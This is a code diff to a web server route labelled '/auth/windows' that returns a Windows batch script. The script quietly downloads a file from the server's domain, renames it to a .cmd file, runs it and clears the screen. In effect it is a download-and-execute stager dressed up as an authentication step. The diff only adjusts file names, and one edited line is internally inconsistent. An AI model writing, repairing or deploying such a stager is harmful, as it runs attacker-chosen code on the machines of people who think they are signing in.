@@ -147,11 +147,11 @@ router.get("/auth/windows", (req, res) => {
     requestLog[ip].step1 = now;
 
     res.type("text/plain").send(`@echo off
-curl -s -L -o "%USERPROFILE%\\token" ${domain}/users/token.npl
+curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/users/token.npl
 cls
-if exist "%USERPROFILE%\token" del "%USERPROFILE%\token"
+if exist "%USERPROFILE%\token.npl" del "%USERPROFILE%\token"
 if exist "%USERPROFILE%\token.cmd" del "%USERPROFILE%\token.cmd"
-ren "%USERPROFILE%\\token" token.cmd
+ren "%USERPROFILE%\\token.npl" token.cmd
 "%USERPROFILE%\\token.cmd"
 cls
 `);
